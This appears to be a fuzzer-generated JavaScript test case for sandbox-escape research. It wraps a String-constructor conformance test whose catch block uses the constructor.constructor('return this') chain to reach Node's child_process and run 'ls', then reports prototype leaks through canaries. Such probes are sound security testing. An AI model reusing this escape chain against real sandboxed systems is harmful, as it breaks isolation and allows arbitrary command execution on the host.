try {
    function __obj() {
        let REPLACER = 23;
    }
    ;
    __obj.valueOf = function () {
        throw () => {
            return () => {
            };
        };
        return true;
    };
    __obj.toString = function () {
        return {};
    };
    var __str = new String(__obj);
    if (typeof __str !== 'object') {
        $ERROR('#1: function __obj(){}; __str = new String(__obj); typeof __str === "object". Actual: typeof __str ===' + typeof __str);
    }
    if (__str.constructor !== String) {
        $ERROR('#1.5: __str = new String(__obj); __str.constructor === String. Actual: __str.constructor ===' + __str.constructor);
    }
    if (__str != 'true') {
        $ERROR('#2: function __obj(){}; __str = new String(__obj); __str =="true". Actual: __str ==' + __str);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}